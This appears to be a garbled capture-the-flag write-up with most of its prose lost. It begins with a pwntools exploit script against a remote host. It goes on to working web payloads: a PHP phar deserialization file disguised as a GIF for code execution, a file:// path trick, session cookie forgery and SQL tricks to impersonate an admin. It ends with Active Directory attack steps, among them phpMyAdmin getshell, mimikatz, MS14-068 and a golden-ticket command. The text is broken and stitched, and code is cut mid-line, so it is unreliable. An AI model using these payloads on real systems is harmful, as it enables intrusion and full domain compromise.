from pwn import *
import ctypes, copy, time 
libc = ctypes.CDLL("libc.so.6")
c32 = lambda x: ctypes.c_uint32(x).value
c8 = lambda x: ctypes.c_uint8(x).value 
h2n = lambda x: map(ord, x.decode('hex'))
n2h = lambda x: ''.join(map(chr, x)).encode('hex')
#p = process("./just_pwn")
p = remote("118.25.148.66", 2333)
libc.srand(libc.time(0))
class NumbnutsBlockCipher(object):
    def __init__(self):
        self.add_key = []
        self.sr1 = []
        self.sr2 = []
        self.xor_key = []
        for i in xrange(16):
            self.add_key.append(c8(libc.rand()))
            self.sr1.append(c8(libc.rand()) & 0xf)
            self.sr2.append(c8(libc.rand()) & 0xf)
            self.xor_key.append(c8(libc.rand()))
        return
    def pad(self, data):
        if len(data) % 16 == 0:
            return data + [0x10] * 0x10
        c = len(data) % 16
        return data + [16 - c] * (16 - c)
    def unpad(self, data):
        return data[:-data[-1]]
    def decrypt_round(self, out):
        assert len(out) == 16
        for i in xrange(16):
            out[self.sr1[i]] ^= self.xor_key[i]
            out[self.sr2[i]] ^= self.xor_key[i]
        for i in xrange(16):
            out[i] = c8(out[i] - self.add_key[i])
        return out 
    def encrypt_round(self, out):
        assert len(out) == 16
        for i in xrange(16):
            out[i] = c8(out[i] + self.add_key[i])
        for i in xrange(16):
            out[self.sr1[i]] ^= self.xor_key[i]
            out[self.sr2[i]] ^= self.xor_key[i]
        return out 
    def hex2num(self, data):
        return map(ord, data.decode('hex'))
    def encrypt(self, data, iv):
        data = self.pad(data)
        bn = 0
        result = []
        while bn * 16 90520735500403(int)
 /home/lctf/.ssh/authorized_keys   
T4lk 1s ch34p,sh0w m3 the sh31l
http://212.64.7.171/LCTF.php
$SECRET  = `../read_secret`;                                   
$SANDBOX = "../data/" . md5($SECRET. $_SERVER["REMOTE_ADDR"]); 
$FILEBOX = "../file/" . md5("K0rz3n". $_SERVER["REMOTE_ADDR"]);  
class K0rz3n_secret_flag { 
    protected $file_path; 
    function __destruct(){ 
1. includewebshell
 if(preg_match('/(log|etc|session|proc|data|read_secret|history|class|\.\.)
/i', $this->file_path)){ 
            die("Sorry Sorry Sorry"); 
        } 
    include_once($this->file_path); 
 } 
} 
function check_session(){
   //cookie
  //return $SANDBOX
}
...
$mode = $_GET["m"]; 
if ($mode == "upload"){ 
     upload(check_session()); 
} 
else if ($mode == "show"){ 
    show(check_session()); 
} 
else if ($mode == "check"){ 
    check(check_session()); 
} 
else if($mode == "move"){ 
    move($_GET['source'],$_GET['dest']); 
} 
else{ 
    highlight_file(__FILE__);     
} 
2. remoteipphar
GIF89a
file_path)){
            die("Sorry Sorry Sorry");
        }
    include_once($this->file_path);
    }
 }
$a= new K0rz3n_secret_flag;
$p = new Phar('./1.phar', 0);
$p->startBuffering();
$p->setStub('GIF89a');
$p->setMetadata($a);
$p->addFromString('1.txt','text');
$p->stopBuffering();
rename('./1.phar', 'avatar.gif');
3. wrapper phar:// =>RCE
L playground2
http://212.64.7.239
os.path.join, /var/www/project/playground/
pyc
main.pyusernameadminget ﬂag
>>> os.path.join('/etc', '/passwd')
'/passwd'
http://212.64.7.239/sandbox?
url=file://sandbox//var/www/project/playground/__pycache__&token=LRXfAXOKKI
iR6y0hkqZ9VmbiO5Pkguhn09OVvwF/S5jZ9nJ4w0abYS5ADGreQd9mENGxPUQ4OLrtPOh7vuXCX
BqQ/BHAyiwWONd01jW0ONdLSyLOI/fy3sr+lIvGei5ue9wd/XqM9WawN26tpaZ372nitSp6ZONi
O1VGFtgwdmpgwMvUlZPgzj5vcgGRSNFj
@app.route('/')
def index():
    user = request.cookies.get('user', '')
    try:
        username = session_decode(user)
 session.py  session_encode , 
session_encode(content) => base32(content).[MDA(char) for char in content]
 MDA (MDxMAC), seed, 
. usercookie, main.py 
5username, session_encode. username, 
MDA, .
EZ OAuth
https://lctf.1slb.net/
 OAUTH  TYPCN  https://accounts.typcn.com/ 
TYPCN pwnhub.cn
    except Exception:
        username = get_username()
        content = escape(username)
    else:
        if username == 'admin':
            content = escape(FLAG)
        else:
            content = escape(username)
    resp = make_response(render_template('main.html', content=content))
    return resp
b962d95efd252479 => a
84407154c863ef36 => d
e80346042c47531a => m
6e1beb0db216d969 => i
b020cd1cf4031b57 => n
MFSG22LO.b962d95efd25247984407154c863ef36e80346042c47531a6e1beb0db216d969b0
20cd1cf4031b57
 pwnhub.cn
 xxxx@pwnhub.cn.mydomain 
 pwnhub.cn.mydomain  
userssrf -> 
https
burpjson
json sign(jsondata.result) == jsondata.sign  
 result  
 json 
 sign:true  
hint: admin
 true admin 
http://212.64.13.122
id 
  select id
session  update id
mysql @@timestamp  @@pseudo_thread_id 
 id=myid-@@timestamp mod 2*(myid-adminid)  select  update 
id select id update adminid
admin
. poc
+1,myidadminid
admin
id=100001+@a=@a=@a is not null 
id = myid-(myid-adminid)*@t:=@t:=@t is not null
admin 
py: 
God of domain pentest
windows 
c0-2021-255 
web.lctf.comweb.lctf.com\buguake,172.21.0.8 
188.131.161.90
nmapwebsocks51080 1090. 0.880
phpmyadmin general_log getshell.
2333 mimikatzadministrator.
 SUB-DC.web.lctf.com ms14068.( impacket
goldenPac.py )
sub-dc.
mimikatzADGold Ticket
Enterprise AdminEnterprise AdminADAdministrator
sidHistoryEnterprise Admin.
misc:cmd cmdﬂag.( dc.lctf.com )
kerberos::golden /domain:web.lctf.com /sid:sid /sids:sid 
/krbtgt:nthash /user:
.
sh0w m3 the sh31l 4ga1n
http://212.64.74.153/LCTF.php
 data  
phar://data
1. 
getshellbash